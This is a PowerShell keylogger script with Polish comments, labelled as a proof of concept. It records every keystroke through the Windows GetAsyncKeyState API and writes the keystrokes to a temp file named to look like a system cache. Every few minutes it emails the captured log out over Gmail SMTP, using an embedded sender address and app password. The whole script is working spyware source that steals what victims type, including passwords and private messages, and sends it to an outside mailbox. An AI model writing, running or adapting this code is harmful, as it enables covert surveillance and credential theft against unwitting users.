# --- CONFIGURATION ---
$SmtpServer = "smtp.gmail.com"
$SmtpPort = 587
$EmailFrom = "nadawca@gmail.com"
$EmailTo = "odbiorca@gmail.com"
$SmtpUser = "nadawca@gmail.com"
$SmtpPass = "hwaoknscoaqgclqb" # 16 znaków z Google (bez spacji)
$IntervalMinutes = 1 # Testuj na 1 minucie, potem zmień na 15
# ---------------------

# KLUCZ DO DZIAŁANIA NA WIN 8/10: Wymuszenie TLS 1.2 dla Gmaila
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 -bor [Net.SecurityProtocolType]::Tls11 -bor [Net.SecurityProtocolType]::Tls

$LogPath = "$env:TEMP\mscordbi_cache.tmp"
$LastSend = Get-Date

# Funkcja przechwytująca klawisze (Kompatybilna z każdym Win od 8 wzwyż)
$Sign = @"
using System;
using System.Runtime.InteropServices;
public class Win32 {
    [DllImport("user32.dll")]
    public static extern short GetAsyncKeyState(int vKey);
}
"@
Add-Type -TypeDefinition $Sign

while ($true) {
    # Pętla sprawdzająca klawisze 8-254 (standardowe znaki i funkcyjne)
    for ($i = 8; $i -le 254; $i++) {
        $state = [Win32]::GetAsyncKeyState($i)
        if ($state -band 0x0001) {
            $char = [char]$i
            switch ($i) {
                8   { $char = "[BKSP]" }
                13  { $char = "`r`n[ENTR]`r`n" }
                32  { $char = " " }
                9   { $char = "[TAB]" }
                160 { $char = "" } # Ignoruj sam Shift dla czytelności
                161 { $char = "" }
            }
            # Zapis do pliku z jawnym kodowaniem UTF8
            Out-File -FilePath $LogPath -Append -InputObject $char -Encoding utf8
        }
    }

    # Logika wysyłki
    if ((Get-Date) -gt $LastSend.AddMinutes($IntervalMinutes)) {
        if (Test-Path $LogPath) {
            $LogContent = Get-Content $LogPath -Raw
            if ($LogContent -and $LogContent.Length -gt 2) {
                try {
                    $SecurePass = ConvertTo-SecureString $SmtpPass -AsPlainText -Force
                    $Creds = New-Object System.Management.Automation.PSCredential($SmtpUser, $SecurePass)
                    
                    Send-MailMessage -From $EmailFrom -To $EmailTo -Subject "PoC Windows Report" -Body $LogContent -SmtpServer $SmtpServer -Port $SmtpPort -UseSsl -Credential $Creds
                    
                    # Czyść log tylko jeśli wysyłka się udała
                    Clear-Content $LogPath
                } catch {
                    # Jeśli błąd (np. brak internetu), spróbuje za minutę
                }
            }
            $LastSend = Get-Date
        }
    }
    Start-Sleep -Milliseconds 20
}
